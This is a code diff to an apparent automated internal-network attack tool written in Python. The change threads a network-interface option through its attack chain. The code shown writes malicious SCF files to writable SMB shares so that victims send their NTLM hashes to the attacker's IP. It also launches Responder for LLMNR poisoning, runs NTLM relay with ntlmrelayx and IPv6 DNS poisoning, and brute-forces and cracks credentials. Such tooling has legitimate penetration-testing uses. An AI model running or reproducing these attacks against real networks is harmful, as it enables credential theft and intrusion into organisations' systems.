@@ -33,6 +33,7 @@ def parse_args():
     parser.add_argument("-p", "--password-list", help="Path to password list file")
     parser.add_argument("-s", "--skip", default='', help="Skip [rid/scf/responder/ntlmrelay/dns/crack] where the first 5 options correspond to attacks 1-5")
     parser.add_argument("-t", "--time", default='10', help="Number of minutes to run the LLMNR/Responder attack; defaults to 10m")
+    parser.add_argument("-i", "--interface", help="Interface to use with Responder")
     return parser.parse_args()
 
 def parse_nmap(args):
@@ -114,7 +115,7 @@ def get_share(l, share):
         share = l.strip()[:-1]
     return share
 
-def parse_nse(hosts, args):
+def parse_nse(hosts, args, iface):
     '''
     Parse NSE script output
     '''
@@ -137,7 +138,7 @@ def parse_nse(hosts, args):
             if 'scf' not in args.skip.lower():
                 if script_out['id'] == 'smb-enum-shares':
                     lines = script_out['output'].splitlines()
-                    anon_share_found = write_scf_files(lines, ip, args, anon_share_found)
+                    anon_share_found = write_scf_files(lines, ip, args, anon_share_found, iface)
                     local_scf_cleanup()
 
     if 'scf' not in args.skip.lower():
@@ -160,12 +161,12 @@ def run_smbclient(server, share_name, action, scf_filepath):
     stdout, stderr = Popen(smbclient_cmd.split(), stdout=PIPE, stderr=PIPE).communicate()
     return stdout, stderr
 
-def write_scf_files(lines, ip, args, anon_share_found):
+def write_scf_files(lines, ip, args, anon_share_found, iface):
     '''
     Writes SCF files to writeable shares based on Nmap smb-enum-shares output
     '''
     share = None
-    scf_filepath = create_scf()
+    scf_filepath = create_scf(iface)
 
     for l in lines:
         share = get_share(l, share)
@@ -196,17 +197,17 @@ def write_scf_files(lines, ip, args, anon_share_found):
                             for line in stdout_lines:
                                 if 'Error:' in line:
                                     print('[-] Error writing SCF file: \n    '+line.strip())
-    
+
     return anon_share_found
 
-def create_scf():
+def create_scf(iface):
     '''
     Creates scf file and smbclient.py commands file
     '''
     scf_filename = '@local.scf'
 
     if not os.path.isfile(scf_filename):
-        scf_data = '[Shell]\r\nCommand=2\r\nIconFile=\\\\{}\\file.ico\r\n[Taskbar]\r\nCommand=ToggleDesktop'.format(get_ip())
+        scf_data = '[Shell]\r\nCommand=2\r\nIconFile=\\\\{}\\file.ico\r\n[Taskbar]\r\nCommand=ToggleDesktop'.format(get_local_ip(iface))
         write_to_file(scf_filename, scf_data, 'w+')
 
     cwd = os.getcwd()+'/'
@@ -569,22 +570,29 @@ def get_iface():
     '''
     Gets the right interface for Responder
     '''
-    ifaces = []
-    for iface in netifaces.interfaces():
-    # list of ipv4 addrinfo dicts
-        ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
-        for entry in ipv4s:
-            addr = entry.get('addr')
-            if not addr:
-                continue
-            if not (iface.startswith('lo') or addr.startswith('127.')):
-                ifaces.append(iface)
+    try:
+        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
+    except:
+        ifaces = []
+        for iface in netifaces.interfaces():
+            # list of ipv4 addrinfo dicts
+            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
 
-    # Probably will only find 1 interface, but in case of more just use the first one
-    return ifaces[0]
+            for entry in ipv4s:
+                addr = entry.get('addr')
+                if not addr:
+                    continue
+                if not (iface.startswith('lo') or addr.startswith('127.')):
+                    ifaces.append(iface)
 
-def get_ip():
-    iface = get_iface()
+        iface = ifaces[0]
+
+    return iface
+
+def get_local_ip(iface):
+    '''
+    Gets the the local IP of an interface
+    '''
     ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
     return ip
 
@@ -717,22 +725,20 @@ def check_found_passwords(host_user_pwd):
 
     return False
 
-def start_responder_llmnr():
+def start_responder_llmnr(iface):
     '''
     Start Responder alone for LLMNR attack
     '''
     edit_responder_conf('On', ['HTTP', 'SMB'])
-    iface = get_iface()
     resp_cmd = 'python2 submodules/Responder/Responder.py -wrd -I {}'.format(iface)
     resp_proc = run_proc(resp_cmd)
     print('[*] Responder-Session.log:')
     return resp_proc
 
-def run_relay_attack():
+def run_relay_attack(iface):
     '''
     Start ntlmrelayx for ntlm relaying
     '''
-    iface = get_iface()
     edit_responder_conf('Off', ['HTTP', 'SMB'])
     resp_cmd = 'python2 submodules/Responder/Responder.py -wrd -I {}'.format(iface)
     resp_proc = run_proc(resp_cmd)
@@ -972,14 +978,14 @@ def run_ipv6_dns_poison():
 
     return mitm6_proc
 
-def do_ntlmrelay(prev_creds, args):
+def do_ntlmrelay(prev_creds, args, iface):
     '''
     Continuously monitor and parse ntlmrelay output
     '''
     mitm6_proc = None
 
     print('\n[*] Attack 4: NTLM relay with Responder and ntlmrelayx')
-    resp_proc, ntlmrelay_proc = run_relay_attack()
+    resp_proc, ntlmrelay_proc = run_relay_attack(iface)
 
     if 'dns' not in args.skip:
         print('\n[*] Attack 5: IPv6 DNS Poison')
@@ -1086,13 +1092,19 @@ def main(report, args):
         SMB reverse bruteforce
         Responder LLMNR poisoning
         SMB relay
+        IPv6 DNS poisoning
         Hash cracking
     '''
     prev_creds = []
     prev_users = []
     loop = asyncio.get_event_loop()
-
     passwords = create_passwords(args)
+
+    # Get the interface to use with Responder, also used for local IP lookup
+    if args.interface:
+        iface = args.interface
+    else:
+        iface = get_iface()
 
     # Returns a list of Nmap object hosts
     # So you must use host.address, for example, to get the ip
@@ -1113,7 +1125,7 @@ def main(report, args):
             prev_creds, prev_users, domains = smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users)
 
         # ATTACK 2: SCF file upload to writeable shares
-        parse_nse(hosts, args)
+        parse_nse(hosts, args, iface)
 
     else:
         print('[-] No hosts with port 445 open. \
@@ -1123,7 +1135,7 @@ def main(report, args):
     if 'llmnr' not in args.skip.lower():
         print('\n[*] Attack 3: LLMNR/NBTS/mDNS poisoning for NTLM hashes')
         prev_lines = []
-        resp_proc = start_responder_llmnr()
+        resp_proc = start_responder_llmnr(iface)
         time.sleep(2)
 
         # Check for hashes for set amount of time
@@ -1148,7 +1160,7 @@ def main(report, args):
     # ATTACK 4: NTLM relay
     # ATTACK 5: IPv6 DNS WPAD spoof
     if 'relay' not in args.skip.lower() and len(hosts) > 0:
-        do_ntlmrelay(prev_creds, args)
+        do_ntlmrelay(prev_creds, args, iface)
 
 if __name__ == "__main__":
     args = parse_args()
@@ -1156,8 +1168,3 @@ if __name__ == "__main__":
         exit('[-] Run as root')
     report = parse_nmap(args)
     main(report, args)
-
-# Left off
-# Change responder hash-finding to read Responder-Session.log and not the hash file
-# Multiple hashes get stored in the hashfile so just continually checking for new hash files
-# wont work at all on new hashes written to the same file
